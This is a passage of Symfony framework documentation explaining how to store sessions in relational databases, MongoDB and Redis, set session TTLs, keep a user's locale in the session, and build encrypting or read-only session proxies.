</framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework->session()\n                ->handlerId(PdoSessionHandler::class)\n            ;\n        };\n\nConfiguring the Session Table and Column Names\n..............................................\n\nThe table used to store sessions is called ``sessions`` by default and defines\ncertain column names. You can configure these values with the second argument\npassed to the ``PdoSessionHandler`` service:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n\n            Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler:\n                arguments:\n                    - '%env(DATABASE_URL)%'\n                    - { db_table: 'customer_session', db_id_col: 'guid' }\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler\">\n                    <argument>%env(DATABASE_URL)%</argument>\n                    <argument type=\"collection\">\n                        <argument key=\"db_table\">customer_session</argument>\n                        <argument key=\"db_id_col\">guid</argument>\n                    </argument>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler;\n\n        return static function (ContainerConfigurator $container): void {\n            $services = $container->services();\n\n            $services->set(PdoSessionHandler::class)\n                ->args([\n                    env('DATABASE_URL'),\n                    ['db_table' => 'customer_session', 'db_id_col' => 'guid'],\n                ])\n            ;\n        };\n\nThese are parameters that you can configure:\n\n``db_table`` (default ``sessions``):\n    The name of the session table in your database;\n\n``db_username``: (default: ``''``)\n    The username used to connect when using the PDO configuration (when using\n    the connection based on the ``DATABASE_URL`` env var, it overrides the\n    username defined in the env var).\n\n``db_password``: (default: ``''``)\n    The password used to connect when using the PDO configuration (when using\n    the connection based on the ``DATABASE_URL`` env var, it overrides the\n    password defined in the env var).\n\n``db_id_col`` (default ``sess_id``):\n    The name of the column where to store the session ID (column type: ``VARCHAR(128)``);\n\n``db_data_col`` (default ``sess_data``):\n    The name of the column where to store the session data (column type: ``BLOB``);\n\n``db_time_col`` (default ``sess_time``):\n    The name of the column where to store the session creation timestamp (column type: ``INTEGER``);\n\n``db_lifetime_col`` (default ``sess_lifetime``):\n    The name of the column where to store the session lifetime (column type: ``INTEGER``);\n\n``db_connection_options`` (default: ``[]``)\n    An array of driver-specific connection options;\n\n``lock_mode`` (default: ``LOCK_TRANSACTIONAL``)\n    The strategy for locking the database to avoid *race conditions*. Possible\n    values are ``LOCK_NONE`` (no locking), ``LOCK_ADVISORY`` (application-level\n    locking) and ``LOCK_TRANSACTIONAL`` (row-level locking).\n\nPreparing the Database to Store Sessions\n........................................\n\nBefore storing sessions in the database, you must create the table that stores\nthe information.\n\nWith Doctrine installed, the session table will be automatically generated when\nyou run the ``make:migration`` command if the database targeted by doctrine is\nidentical to the one used by this component.\n\nOr if you prefer to create the table yourself and the table has not already been\ncreated, the session handler provides a method called\n:method:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Storage\\\\Handler\\\\PdoSessionHandler::createTable`\nto set up this table for you according to the database engine used::\n\n    try {\n        $sessionHandlerService->createTable();\n    } catch (\\PDOException $exception) {\n        // the table could not be created for some reason\n    }\n\nIf the table already exists an exception will be thrown.\n\nIf you would rather set up the table yourself, it's recommended to generate an\nempty database migration with the following command:\n\n.. code-block:: terminal\n\n    $ php bin/console doctrine:migrations:generate\n\nThen, find the appropriate SQL for your database below, add it to the migration\nfile and run the migration with the following command:\n\n.. code-block:: terminal\n\n    $ php bin/console doctrine:migrations:migrate\n\nIf needed, you can also add this table to your schema by calling\n:method:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Storage\\\\Handler\\\\PdoSessionHandler::configureSchema`\nmethod in your code.\n\n.. _mysql:\n\nMariaDB/MySQL\n+++++++++++++\n\n.. code-block:: sql\n\n    CREATE TABLE `sessions` (\n        `sess_id` VARBINARY(128) NOT NULL PRIMARY KEY,\n        `sess_data` BLOB NOT NULL,\n        `sess_lifetime` INTEGER UNSIGNED NOT NULL,\n        `sess_time` INTEGER UNSIGNED NOT NULL,\n        INDEX `sessions_sess_lifetime_idx` (`sess_lifetime`)\n    ) COLLATE utf8mb4_bin, ENGINE = InnoDB;\n\n.. note::\n\n    A ``BLOB`` column type (which is the one used by default by ``createTable()``)\n    stores up to 64 kb. If the user session data exceeds this, an exception may\n    be thrown or their session will be silently reset. Consider using a ``MEDIUMBLOB``\n    if you need more space.\n\nPostgreSQL\n++++++++++\n\n.. code-block:: sql\n\n    CREATE TABLE sessions (\n        sess_id VARCHAR(128) NOT NULL PRIMARY KEY,\n        sess_data BYTEA NOT NULL,\n        sess_lifetime INTEGER NOT NULL,\n        sess_time INTEGER NOT NULL\n    );\n    CREATE INDEX sessions_sess_lifetime_idx ON sessions (sess_lifetime);\n\nMicrosoft SQL Server\n++++++++++++++++++++\n\n.. code-block:: sql\n\n    CREATE TABLE sessions (\n        sess_id VARCHAR(128) NOT NULL PRIMARY KEY,\n        sess_data NVARCHAR(MAX) NOT NULL,\n        sess_lifetime INTEGER NOT NULL,\n        sess_time INTEGER NOT NULL,\n        INDEX sessions_sess_lifetime_idx (sess_lifetime)\n    );\n\n.. _session-database-mongodb:\n\nStore Sessions in a NoSQL Database (MongoDB)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony includes a\n:class:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Storage\\\\Handler\\\\MongoDbSessionHandler`\nto store sessions in the MongoDB NoSQL database. First, make sure to have a\nworking MongoDB connection in your Symfony application as explained in the\n`DoctrineMongoDBBundle configuration`_ article.\n\nThen, register a new handler service for ``MongoDbSessionHandler`` and pass it\nthe MongoDB connection as argument, and the required parameters:\n\n``database``:\n    The name of the database\n\n``collection``:\n    The name of the collection\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n\n            Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MongoDbSessionHandler:\n                arguments:\n                    - '@doctrine_mongodb.odm.default_connection'\n                    - { database: '%env(MONGODB_DB)%', collection: 'sessions' }\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <services>\n                <service id=\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MongoDbSessionHandler\">\n                    <argument type=\"service\">doctrine_mongodb.odm.default_connection</argument>\n                    <argument type=\"collection\">\n                        <argument key=\"database\">%env('MONGODB_DB')%</argument>\n                        <argument key=\"collection\">sessions</argument>\n                    </argument>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MongoDbSessionHandler;\n\n        return static function (ContainerConfigurator $container): void {\n            $services = $container->services();\n\n            $services->set(MongoDbSessionHandler::class)\n                ->args([\n                    service('doctrine_mongodb.odm.default_connection'),\n                    ['database' => '%env(\"MONGODB_DB\")%', 'collection' => 'sessions']\n                ])\n            ;\n        };\n\nNext, use the :ref:`handler_id <config-framework-session-handler-id>`\nconfiguration option to tell Symfony to use this service as the session handler:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            session:\n                # ...\n                handler_id: Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MongoDbSessionHandler\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <!-- ... -->\n                <framework:session\n                    handler-id=\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MongoDbSessionHandler\"/>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MongoDbSessionHandler;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework->session()\n                ->handlerId(MongoDbSessionHandler::class)\n            ;\n        };\n\nThat's all! Symfony will now use your MongoDB server to read and write the\nsession data. You do not need to do anything to initialize your session\ncollection. However, you may want to add an index to improve garbage collection\nperformance. Run this from the `MongoDB shell`_:\n\n.. code-block:: javascript\n\n    use session_db\n    db.session.createIndex( { \"expires_at\": 1 }, { expireAfterSeconds: 0 } )\n\nConfiguring the Session Field Names\n...................................\n\nThe collection used to store sessions defines certain field names. You can\nconfigure these values with the second argument passed to the\n``MongoDbSessionHandler`` service:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n\n            Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MongoDbSessionHandler:\n                arguments:\n                    - '@doctrine_mongodb.odm.default_connection'\n                    -\n                        database: '%env(MONGODB_DB)%'\n                        collection: 'sessions'\n                        id_field: '_guid'\n                        expiry_field: 'eol'\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MongoDbSessionHandler\">\n                    <argument type=\"service\">doctrine_mongodb.odm.default_connection</argument>\n                    <argument type=\"collection\">\n                        <argument key=\"database\">%env('MONGODB_DB')%</argument>\n                        <argument key=\"collection\">sessions</argument>\n                        <argument key=\"id_field\">_guid</argument>\n                        <argument key=\"expiry_field\">eol</argument>\n                    </argument>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MongoDbSessionHandler;\n\n        return static function (ContainerConfigurator $container): void {\n            $services = $container->services();\n\n            $services->set(MongoDbSessionHandler::class)\n                ->args([\n                    service('doctrine_mongodb.odm.default_connection'),\n                    [\n                        'database' => '%env('MONGODB_DB')%',\n                        'collection' => 'sessions'\n                        'id_field' => '_guid',\n                        'expiry_field' => 'eol',\n                    ],\n                ])\n            ;\n        };\n\nThese are parameters that you can configure:\n\n``id_field`` (default ``_id``):\n    The name of the field where to store the session ID;\n\n``data_field`` (default ``data``):\n    The name of the field where to store the session data;\n\n``time_field`` (default ``time``):\n    The name of the field where to store the session creation timestamp;\n\n``expiry_field`` (default ``expires_at``):\n    The name of the field where to store the session lifetime.\n\nMigrating Between Session Handlers\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf your application changes the way sessions are stored, use the\n:class:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Storage\\\\Handler\\\\MigratingSessionHandler`\nto migrate between old and new save handlers without losing session data.\n\nThis is the recommended migration workflow:\n\n#. Switch to the migrating handler, with your new handler as the write-only one.\n   The old handler behaves as usual and sessions get written to the new one::\n\n       $sessionStorage = new MigratingSessionHandler($oldSessionStorage, $newSessionStorage);\n\n#. After your session gc period, verify that the data in the new handler is correct.\n#. Update the migrating handler to use the old handler as the write-only one, so\n   the sessions will now be read from the new handler. This step allows easier rollbacks::\n\n       $sessionStorage = new MigratingSessionHandler($newSessionStorage, $oldSessionStorage);\n\n#. After verifying that the sessions in your application are working, switch\n   from the migrating handler to the new handler.\n\n.. _session-configure-ttl:\n\nConfiguring the Session TTL\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony by default will use PHP's ini setting ``session.gc_maxlifetime`` as\nsession lifetime. When you store sessions in a database, you can also\nconfigure your own TTL in the framework configuration or even at runtime.\n\n.. note::\n\n    Changing the ini setting is not possible once the session is started so\n    if you want to use a different TTL depending on which user is logged\n    in, you must do it at runtime using the callback method below.\n\nConfigure the TTL\n.................\n\nYou need to pass the TTL in the options array of the session handler you are using:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n            Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler:\n                arguments:\n                    - '@Redis'\n                    - { 'ttl': 600 }\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <services>\n            <service id=\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler\">\n                <argument type=\"service\" id=\"Redis\"/>\n                <argument type=\"collection\">\n                    <argument key=\"ttl\">600</argument>\n                </argument>\n            </service>\n        </services>\n\n    .. code-block:: php\n\n        // config/services.php\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler;\n\n        $services\n            ->set(RedisSessionHandler::class)\n            ->args([\n                service('Redis'),\n                ['ttl' => 600],\n            ]);\n\nConfigure the TTL Dynamically at Runtime\n........................................\n\nIf you would like to have a different TTL for different users or sessions\nfor whatever reason, this is also possible by passing a callback as the TTL\nvalue. The callback will be called right before the session is written and\nhas to return an integer which will be used as TTL.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n            Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler:\n                arguments:\n                    - '@Redis'\n                    - { 'ttl': !closure '@my.ttl.handler' }\n\n            my.ttl.handler:\n                class: Some\\InvokableClass # some class with an __invoke() method\n                arguments:\n                    # Inject whatever dependencies you need to be able to resolve a TTL for the current session\n                    - '@security'\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <services>\n            <service id=\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler\">\n                <argument type=\"service\" id=\"Redis\"/>\n                <argument type=\"collection\">\n                    <argument key=\"ttl\" type=\"closure\" id=\"my.ttl.handler\"/>\n                </argument>\n            </service>\n            <!-- some class with an __invoke() method -->\n            <service id=\"my.ttl.handler\" class=\"Some\\InvokableClass\">\n                <!-- Inject whatever dependencies you need to be able to resolve a TTL for the current session -->\n                <argument type=\"service\" id=\"security\"/>\n            </service>\n        </services>\n\n    .. code-block:: php\n\n        // config/services.php\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler;\n\n        $services\n            ->set(RedisSessionHandler::class)\n            ->args([\n                service('Redis'),\n                ['ttl' => closure(service('my.ttl.handler'))],\n            ]);\n\n        $services\n            // some class with an __invoke() method\n            ->set('my.ttl.handler', 'Some\\InvokableClass')\n            // Inject whatever dependencies you need to be able to resolve a TTL for the current session\n            ->args([service('security')]);\n\n.. _locale-sticky-session:\n\nMaking the Locale \"Sticky\" during a User's Session\n--------------------------------------------------\n\nSymfony stores the locale setting in the Request, which means that this setting\nis not automatically saved (\"sticky\") across requests. But, you *can* store the\nlocale in the session, so that it's used on subsequent requests.\n\nCreating a LocaleSubscriber\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nCreate a :ref:`new event subscriber <events-subscriber>`. Typically,\n``_locale`` is used as a routing parameter to signify the locale, though you\ncan determine the correct locale however you want::\n\n    // src/EventSubscriber/LocaleSubscriber.php\n    namespace App\\EventSubscriber;\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\HttpKernel\\Event\\RequestEvent;\n    use Symfony\\Component\\HttpKernel\\KernelEvents;\n\n    class LocaleSubscriber implements EventSubscriberInterface\n    {\n        public function __construct(\n            private string $defaultLocale = 'en',\n        ) {\n        }\n\n        public function onKernelRequest(RequestEvent $event): void\n        {\n            $request = $event->getRequest();\n            if (!$request->hasPreviousSession()) {\n                return;\n            }\n\n            // try to see if the locale has been set as a _locale routing parameter\n            if ($locale = $request->attributes->get('_locale')) {\n                $request->getSession()->set('_locale', $locale);\n            } else {\n                // if no explicit locale has been set on this request, use one from the session\n                $request->setLocale($request->getSession()->get('_locale', $this->defaultLocale));\n            }\n        }\n\n        public static function getSubscribedEvents(): array\n        {\n            return [\n                // must be registered before (i.e. with a higher priority than) the default Locale listener\n                KernelEvents::REQUEST => [['onKernelRequest', 20]],\n            ];\n        }\n    }\n\nIf you're using the :ref:`default services.yaml configuration\n<service-container-services-load-example>`, you're done! Symfony will\nautomatically know about the event subscriber and call the ``onKernelRequest``\nmethod on each request.\n\nTo see it working, either set the ``_locale`` key on the session manually (e.g.\nvia some \"Change Locale\" route & controller), or create a route with the\n:ref:`_locale default <translation-locale-url>`.\n\n.. sidebar:: Explicitly Configure the Subscriber\n\n    You can also explicitly configure it, in order to pass in the\n    :ref:`default_locale <config-framework-default_locale>`:\n\n    .. configuration-block::\n\n        .. code-block:: yaml\n\n            # config/services.yaml\n            services:\n                # ...\n\n                App\\EventSubscriber\\LocaleSubscriber:\n                    arguments: ['%kernel.default_locale%']\n                    # uncomment the next line if you are not using autoconfigure\n                    # tags: [kernel.event_subscriber]\n\n        .. code-block:: xml\n\n            <!-- config/services.xml -->\n            <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n            <container xmlns=\"http://symfony.com/schema/dic/services\"\n                xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n                xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                    https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n                <services>\n                    <service id=\"App\\EventSubscriber\\LocaleSubscriber\">\n                        <argument>%kernel.default_locale%</argument>\n\n                        <!-- uncomment the next line if you are not using autoconfigure -->\n                        <!-- <tag name=\"kernel.event_subscriber\"/> -->\n                    </service>\n                </services>\n            </container>\n\n        .. code-block:: php\n\n            // config/services.php\n            use App\\EventSubscriber\\LocaleSubscriber;\n\n            $container->register(LocaleSubscriber::class)\n                ->addArgument('%kernel.default_locale%')\n                // uncomment the next line if you are not using autoconfigure\n                // ->addTag('kernel.event_subscriber')\n            ;\n\nNow celebrate by changing the user's locale and seeing that it's sticky\nthroughout the request.\n\nRemember, to get the user's locale, always use the :method:`Request::getLocale\n<Symfony\\\\Component\\\\HttpFoundation\\\\Request::getLocale>` method::\n\n    // from a controller...\n    use Symfony\\Component\\HttpFoundation\\Request;\n\n    public function index(Request $request): void\n    {\n        $locale = $request->getLocale();\n    }\n\nSetting the Locale Based on the User's Preferences\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nYou might want to improve this technique even further and define the locale\nbased on the user entity of the logged in user. However, since the\n``LocaleSubscriber`` is called before the ``FirewallListener``, which is\nresponsible for handling authentication and setting the user token on the\n``TokenStorage``, you have no access to the user which is logged in.\n\nSuppose you have a ``locale`` property on your ``User`` entity and want to use\nthis as the locale for the given user. To accomplish this, you can hook into\nthe login process and update the user's session with this locale value before\nthey are redirected to their first page.\n\nTo do this, you need an event subscriber on the ``LoginSuccessEvent::class``\nevent::\n\n    // src/EventSubscriber/UserLocaleSubscriber.php\n    namespace App\\EventSubscriber;\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\HttpFoundation\\RequestStack;\n    use Symfony\\Component\\Security\\Http\\Event\\LoginSuccessEvent;\n\n    /**\n     * Stores the locale of the user in the session after the\n     * login. This can be used by the LocaleSubscriber afterwards.\n     */\n    class UserLocaleSubscriber implements EventSubscriberInterface\n    {\n        public function __construct(\n            private RequestStack $requestStack,\n        ) {\n        }\n\n        public function onLoginSuccess(LoginSuccessEvent $event): void\n        {\n            $user = $event->getUser();\n\n            if (null !== $user->getLocale()) {\n                $this->requestStack->getSession()->set('_locale', $user->getLocale());\n            }\n        }\n\n        public static function getSubscribedEvents(): array\n        {\n            return [\n                LoginSuccessEvent::class => 'onLoginSuccess',\n            ];\n        }\n    }\n\n.. warning::\n\n    In order to update the language immediately after a user has changed their\n    language preferences, you also need to update the session when you change\n    the ``User`` entity.\n\nSession Proxies\n---------------\n\nThe session proxy mechanism has a variety of uses and this article demonstrates\ntwo common ones. Rather than using the regular session handler, you can create\na custom save handler by defining a class that extends the\n:class:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Storage\\\\Proxy\\\\SessionHandlerProxy`\nclass.\n\nThen, define the class as a :ref:`service\n<service-container-creating-service>`. If you're using the :ref:`default\nservices.yaml configuration <service-container-services-load-example>`, that\nhappens automatically.\n\nFinally, use the ``framework.session.handler_id`` configuration option to tell\nSymfony to use your session handler instead of the default one:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            session:\n                # ...\n                handler_id: App\\Session\\CustomSessionHandler\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <framework:config>\n                <framework:session handler-id=\"App\\Session\\CustomSessionHandler\"/>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use App\\Session\\CustomSessionHandler;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework->session()\n                ->handlerId(CustomSessionHandler::class)\n            ;\n        };\n\nKeep reading the next sections to learn how to use the session handlers in\npractice to solve two common use cases: encrypt session information and define\nread-only guest sessions.\n\nEncryption of Session Data\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you want to encrypt the session data, you can use the proxy to encrypt and\ndecrypt the session as required. The following example uses the `php-encryption`_\nlibrary, but you can adapt it to any other library that you may be using::\n\n    // src/Session/EncryptedSessionProxy.php\n    namespace App\\Session;\n\n    use Defuse\\Crypto\\Crypto;\n    use Defuse\\Crypto\\Key;\n    use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Proxy\\SessionHandlerProxy;\n\n    class EncryptedSessionProxy extends SessionHandlerProxy\n    {\n        public function __construct(\n            private \\SessionHandlerInterface $handler,\n            private Key $key\n        ) {\n            parent::__construct($handler);\n        }\n\n        public function read($id): string\n        {\n            $data = parent::read($id);\n\n            return Crypto::decrypt($data, $this->key);\n        }\n\n        public function write($id, $data): string\n        {\n            $data = Crypto::encrypt($data, $this->key);\n\n            return parent::write($id, $data);\n        }\n    }\n\nAnother possibility to encrypt session data is to decorate the\n``session.marshaller`` service, which points out to\n:class:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Storage\\\\Handler\\\\MarshallingSessionHandler`.\nYou can decorate this handler with a marshaller that uses encryption,\nlike the :class:`Symfony\\\\Component\\\\Cache\\\\Marshaller\\\\SodiumMarshaller`.\n\nFirst, you need to generate a secure key and add it to your :doc:`secret\nstore </configuration/secrets>` as ``SESSION_DECRYPTION_FILE``:\n\n.. code-block:: terminal\n\n    $ php -r 'echo base64_encode(sodium_crypto_box_keypair());'\n\nThen, register the ``SodiumMarshaller`` service using this key:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n\n            # ...\n            Symfony\\Component\\Cache\\Marshaller\\SodiumMarshaller:\n                decorates: 'session.marshaller'\n                arguments:\n                    - ['%env(file:resolve:SESSION_DECRYPTION_FILE)%']\n                    - '@.inner'\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\"\n        >\n            <services>\n                <service id=\"Symfony\\Component\\Cache\\Marshaller\\SodiumMarshaller\" decorates=\"session.marshaller\">\n                    <argument type=\"collection\">\n                        <argument>env(file:resolve:SESSION_DECRYPTION_FILE)</argument>\n                    </argument>\n                    <argument type=\"service\" id=\".inner\"/>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        use Symfony\\Component\\Cache\\Marshaller\\SodiumMarshaller;\n        use Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\ContainerConfigurator;\n        // ...\n\n        return function(ContainerConfigurator $container) {\n            $services = $container->services();\n\n            // ...\n\n            $services->set(SodiumMarshaller::class)\n                ->decorate('session.marshaller')\n                ->args([\n                    [env('file:resolve:SESSION_DECRYPTION_FILE')],\n                    service('.inner'),\n                ]);\n        };\n\n.. danger::\n\n    This will encrypt the values of the cache items, but not the cache keys. Be\n    careful not to leak sensitive data in the keys.\n\nRead-only Guest Sessions\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nThere are some applications where a session is required for guest users, but\nwhere there is no particular need to persist the session. In this case you can\nintercept the session before it is written::\n\n    // src/Session/ReadOnlySessionProxy.php\n    namespace App\\Session;\n\n    use App\\Entity\\User;\n    use Symfony\\Bundle\\SecurityBundle\\Security;\n    use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Proxy\\SessionHandlerProxy;\n\n    class ReadOnlySessionProxy extends SessionHandlerProxy\n    {\n        public function __construct(\n            private \\SessionHandlerInterface $handler,\n            private Security $security\n        ) {\n            parent::__construct($handler);\n        }\n\n        public function write($id, $data): string\n        {\n            if ($this->getUser() && $this->getUser()->isGuest()) {\n                return;\n            }\n\n            return parent::write($id, $data);\n        }\n\n        private function getUser(): ?User\n        {\n            $user = $this->security->getUser();\n            if (is_object($user)) {\n                return $user;\n            }\n\n            return null;\n        }\n    }\n\n.. _session-avoid-start:\n\nIntegrating with Legacy Applications\n------------------------------------\n\nIf you're integrating the Symfony full-stack Framework into a legacy\napplication that starts the session with ``session_start()``, you may still be\nable to use Symfony's session management by using the PHP Bridge session.\n\nIf the application has its own PHP save handler, you can specify ``null``\nfor the ``handler_id``:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            session:\n                storage_factory_id: session.storage.factory.php_bridge\n                handler_id: ~\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <framework:config>\n                <framework:session storage-factory-id=\"session.storage.factory.php_bridge\"\n                    handler-id=\"null\"\n                />\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->session()\n                ->storageFactoryId('session.storage.factory.php_bridge')\n                ->handlerId(null)\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HttpFoundation\\Session\\Session;\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\PhpBridgeSessionStorage;\n\n        // legacy application configures session\n        ini_set('session.save_handler', 'files');\n        ini_set('session.save_path', '/tmp');\n        session_start();\n\n        // Get Symfony to interface with this existing session\n        $session = new Session(new PhpBridgeSessionStorage());\n\n        // symfony will now interface with the existing PHP session\n        $session->start();\n\nOtherwise, if the problem is that you cannot avoid the application\nstarting the session with ``session_start()``, you can still make use of\na Symfony based session save handler by specifying the save handler as in\nthe example below:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            session:\n                storage_factory_id: session.storage.factory.php_bridge\n                handler_id: session.handler.native_file\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                